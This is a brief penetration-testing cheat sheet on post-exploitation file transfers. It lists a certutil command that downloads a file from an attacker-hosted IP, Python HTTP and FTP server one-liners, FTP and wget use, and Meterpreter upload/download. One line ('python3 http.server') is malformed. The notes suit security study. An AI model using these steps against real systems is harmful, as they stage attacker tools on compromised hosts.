# Post Exploitation: File Transfers

## File Transfers Review

As an attacker, we will usually host a file with python on HTTP or FTP, and will grab it with certutil or FTP or just wget

By Windows:
**Certutil**
```
certutil.exe -urlcache -f http://10.10.10.10/file.txt file.txt
```

Linux/Windows
**HTTP**
```
python -m SimpleHTTPServer 80
python3 http.server
```

Browser
- Navigate directly to file

**FTP**
```
python -m pyftpdlib 21 (attacker machine)
ftp 10.10.10.10 (from Windows machine)
```

**Linux**
```
wget
```

Can also use **metasploit**: upload/download features on Meterpreter
